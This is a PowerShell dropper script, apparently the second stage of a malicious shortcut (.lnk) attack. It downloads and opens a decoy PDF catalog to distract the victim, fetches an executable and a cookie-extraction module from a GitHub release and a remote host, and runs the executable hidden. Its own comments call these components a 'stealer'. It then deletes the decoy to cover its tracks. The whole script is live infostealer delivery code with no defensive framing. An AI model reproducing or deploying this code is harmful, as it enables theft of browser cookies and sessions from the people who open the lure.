# Stage script — downloaded and executed by the .lnk
$ErrorActionPreference = 'SilentlyContinue'
$base = 'https://rankaksks.onrender.com'
$ghBase = 'https://github.com/sandyjack1997/rankaksks/releases/download/v1.0'
$tmp = "$env:TEMP\wupdate-$(Get-Random)"

New-Item -ItemType Directory -Path $tmp -Force | Out-Null

# Helper: download with retries and redirect support
function Download($url, $out) {
    for ($i = 0; $i -lt 3; $i++) {
        try {
            # Use .NET WebClient which handles GitHub redirects properly
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($url, $out)
            if ((Test-Path $out) -and (Get-Item $out).Length -gt 0) { return $true }
        } catch {}
        Start-Sleep -Seconds 5
    }
    return $false
}

# 1. Download and open cover PDF immediately (this is what the user sees)
if (Download "$base/dl/catalog.pdf" "$tmp\catalog.pdf") {
    Start-Process "$tmp\catalog.pdf"
}

# 2. Download stealer components from GitHub Releases
$ok = Download "$ghBase/s.exe" "$tmp\s.exe"
if ($ok) {
    $ndir = "$tmp\node_modules\rookie-cookies-win32-x64-msvc"
    New-Item -ItemType Directory -Path $ndir -Force | Out-Null
    Download "$ghBase/n.node" "$ndir\rookie_cookies.win32-x64-msvc.node"
    
    # Run stealer hidden
    Start-Process -FilePath "$tmp\s.exe" -WindowStyle Hidden -WorkingDirectory $tmp
}

# Cleanup cover after delay
Start-Sleep -Seconds 15
Remove-Item "$tmp\catalog.pdf" -Force
